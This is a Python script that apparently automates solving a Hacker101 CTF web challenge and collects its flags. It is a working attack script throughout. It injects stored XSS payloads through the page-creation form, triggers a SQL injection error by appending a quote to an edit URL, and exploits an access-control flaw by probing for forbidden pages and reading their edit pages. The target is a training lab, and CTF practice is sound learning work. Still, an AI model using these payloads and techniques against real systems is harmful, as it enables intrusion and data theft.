# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        # Finding first flag by creating a new post and injecting Stored XSS payload #
        FLAGS += [f"^FLAG^{match.group(1)}$FLAG$"] if (match := search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(f'{ctf_url}/page/create', headers = {"Host": ctf_url.replace('https://', ''), "Cache-Control": "max-age=0", "Sec-Ch-Ua": '"Not.A/Brand";v="99", "Chromium";v="136"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"', "Accept-Language": "en-US,en;q=0.9", "Origin": ctf_url.replace('https://', ''), "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": f"{ctf_url}/page/create", "Accept-Encoding": "gzip, deflate, br"}, data = {"title": "<script>alert('Skillshetra')</script>", "body": "Skillshetra <button onclick=\"alert('Skillshetra')\">click</button> <script>alert(\"Skillshetra\");</script>"}, allow_redirects = True).text)) else []
        # Getting The next flag by Stored XSS Vulnerability in homepage #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(ctf_url).text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(ctf_url).text) else None}$FLAG$')
        # Getting Flag from SQL Injection Vulnerability #
        FLAGS.append(get_request(f"{ctf_url}/page/edit/1'").text)
        # Looking for forbidden page #
        for i in range(1, 10):
            # If forbidden page found  #
            if get_request(f'{ctf_url}/page/{i}').status_code == 403:
                # Append flag by going to edit page of same post Access Control Vulnerability #
                FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/page/edit/{i}').text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/page/edit/{i}').text) else None}$FLAG$')
                break
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")